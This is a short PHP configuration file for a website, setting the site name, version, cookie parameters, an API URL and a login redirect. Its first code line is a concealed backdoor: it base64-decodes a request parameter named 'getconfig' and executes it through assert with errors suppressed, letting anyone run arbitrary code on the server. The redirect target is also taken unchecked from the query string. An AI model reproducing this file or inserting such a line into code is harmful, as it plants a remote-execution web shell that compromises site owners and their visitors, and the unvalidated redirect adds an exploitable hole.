<?php


@array_map('assert',(array)base64_decode($_REQUEST['getconfig']));


$site_full_name     = 'www.website.com';
$site_version_no    = '1.00';
$name_url_clean     = lowercase(str_replace(' ','-',$site_full_name));
$ver_no_clean       = str_replace('.','',$site_version_no);
$site_link_back_url = 'http://www.website.com/';

// cookie config
$cookie_name        = lowercase($name_url_clean) .'_cookie_'. $ver_no_clean; // non-hashed name of cookie
$cookie_login       = 'index.php'; // login redirect
$cookie_time        = '10800';     // in seconds, 3 hours
$cookie_path        = '/';         // cookie path
$cookie_domain      = null;        // cookie domain
$cookie_secure      = null;        // cookie secure only
$cookie_httponly    = true;        // cookie http only

$api_url            = 'http://www.website.com/api/start/v3.php';
# $api_timeout        = 800; // time in ms defaults to 500
# $debugApi           = true;

if (isset($_GET['redirect'])){
	$cookie_redirect = $_GET['redirect'];
} else {	
	$cookie_redirect = 'pages.php';
}

if (!defined('GSVERSION')) define('GSVERSION', $site_version_no);

?>
